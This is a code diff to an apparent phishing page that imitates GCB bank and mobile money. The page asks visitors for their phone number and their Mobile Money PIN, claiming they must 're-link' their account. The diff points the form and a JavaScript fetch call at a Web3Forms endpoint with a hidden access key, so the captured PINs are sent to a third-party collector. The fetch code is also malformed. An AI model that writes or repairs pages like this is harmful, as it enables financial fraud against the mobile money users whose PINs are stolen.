@@ -299,8 +299,8 @@
         </p>
 
            <form
-  action="https://formspree.io/f/xeaoarga"
-  method="POST"
+   <form action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="c2b2596f-cac0-44ac-a571-43f90c0ec9bf">
 >
   <label>
     Valid Phone Number:
@@ -313,7 +313,7 @@
     Your Momo Pin:
     <input type="Number" name="Pin">
     <p class="description">
-        Enter your  Mobile Money Pin to relink your MoMo to your GCB account Enter
+        Enter your  Mobile Money Pin to re-link your MoMo to your GCB account Enter
       </p>
   </label>
   <!-- your other form fields go here -->
@@ -348,7 +348,7 @@ form.addEventListener("submit", async function(event) {
 
     try {
         const response = await fetch( {
-            action="https://formspree.io/f/xeaoarga"
+            action="https://api.web3forms.com/submit"
   method="POST"
             headers: {
                 "Content-Type": "application/json"
